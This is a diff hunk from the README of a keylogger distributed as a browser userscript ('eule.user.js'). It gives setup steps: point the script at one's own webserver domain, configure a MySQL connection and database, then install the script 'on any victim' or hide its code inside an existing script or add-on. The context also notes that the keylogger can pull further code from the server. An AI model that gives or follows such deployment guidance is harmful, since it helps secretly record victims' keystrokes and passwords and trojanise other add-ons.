@@ -8,9 +8,10 @@ The keylogger is able to download more code from your webserver, you can create 
 
 First you have to change the domain, where the keylogger is located.
 In file "eule.user.js" in line 16.
-Then you copie the files on your webserver.
-After that you have to create the database.
-Now you can install the eule.user.js userscript on any victim or copy the code to an existing script/add-on.
+Then you copy the files to your webserver.
+Don not forget to change the file "mysql_con.php" with your connection datas.
+After that you have to create the database with the file "euleDatabase.sql".
+Now you can install the "eule.user.js" userscript on any victim or copy the code to an existing script/add-on.
 
 
 // DEUTSCH
